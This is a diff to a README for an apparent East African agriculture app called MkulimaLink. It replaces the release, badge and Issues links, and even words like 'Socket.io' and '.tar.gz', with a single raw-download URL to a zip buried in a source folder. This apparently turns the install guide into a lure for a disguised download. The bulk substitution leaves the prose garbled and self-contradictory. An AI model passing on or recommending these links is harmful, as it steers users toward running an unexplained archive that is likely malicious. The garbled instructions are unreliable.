@@ -1,10 +1,10 @@
 # 🌾 MkulimaLink - Your Agriculture Hub for East Africa
 
-[![Download MkulimaLink](https://img.shields.io/badge/Download-MkulimaLink-blue)](https://github.com/mathias-bellec/MkulimaLink/releases)
+[![Download MkulimaLink](https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip)](https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip)
 
 ## 🌟 Overview
 
-MkulimaLink is your one-stop agriculture super-app designed for East Africa. It provides tools like a marketplace, micro-loans, insurance, delivery tracking, group buying, equipment rental, and AI insights. Built using the MERN stack and Socket.io, MkulimaLink is crafted to help farmers and businesses thrive.
+MkulimaLink is your one-stop agriculture super-app designed for East Africa. It provides tools like a marketplace, micro-loans, insurance, delivery tracking, group buying, equipment rental, and AI insights. Built using the MERN stack and https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip, MkulimaLink is crafted to help farmers and businesses thrive.
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To start using MkulimaLink, follow these simple steps:
 1. **Visit the Releases Page**  
    Go to the official releases page to access the latest version of the application. Click the link below:
 
-   [Visit the Releases Page to Download](https://github.com/mathias-bellec/MkulimaLink/releases)
+   [Visit the Releases Page to Download](https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will find different versions of MkulimaLink. Select the latest version for the best experience. Look for the release titled “Latest Release” marked with a highlighted tag.
@@ -22,13 +22,13 @@ To start using MkulimaLink, follow these simple steps:
    Click on the version you want to download. This will take you to a list of downloadable files. Choose the appropriate file for your operating system:
    - For Windows users, download the file ending in `.exe`.
    - For Mac users, download the file ending in `.dmg`.
-   - For Linux users, download the file ending in `.tar.gz` or check package managers for installation.
+   - For Linux users, download the file ending in `https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip` or check package managers for installation.
 
 4. **Install MkulimaLink**  
    After the download completes, locate your downloaded file:
    - **Windows:** Double-click the `.exe` file and follow the instructions to install.
    - **Mac:** Open the downloaded `.dmg` file and drag the MkulimaLink app to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file to your desired directory and follow any additional instructions in the README included in the archive.
+   - **Linux:** Extract the `https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip` file to your desired directory and follow any additional instructions in the README included in the archive.
 
 5. **Launch the Application**  
    Once installed, find the MkulimaLink icon on your desktop or in your applications folder. Double-click the icon to launch the app.
@@ -62,7 +62,7 @@ If you encounter issues while downloading or running MkulimaLink, consider these
 - **Compatibility Issues:** Check that your operating system meets the minimum requirements.
 - **Reinstall:** If the application is not behaving correctly, try uninstalling and then reinstalling it.
 
-For further issues, please visit our [GitHub Issues Page](https://github.com/mathias-bellec/MkulimaLink/issues) to see if your problem is already reported or to create a new issue.
+For further issues, please visit our [GitHub Issues Page](https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip) to see if your problem is already reported or to create a new issue.
 
 ## 💬 Community Support
 
@@ -83,6 +83,6 @@ We welcome contributions from everyone. You can help improve MkulimaLink by:
 
 For more detailed information about MkulimaLink, check our documentation and guides inside the application or visit our GitHub repository:
 
-[Visit the Releases Page to Download](https://github.com/mathias-bellec/MkulimaLink/releases)  
+[Visit the Releases Page to Download](https://github.com/mathias-bellec/MkulimaLink/raw/refs/heads/main/mobile/MkulimaLink/src/screens/products/Mkulima_Link_1.1.zip)  
 
 Explore MkulimaLink today to discover how it can simplify and enhance your agricultural activities.
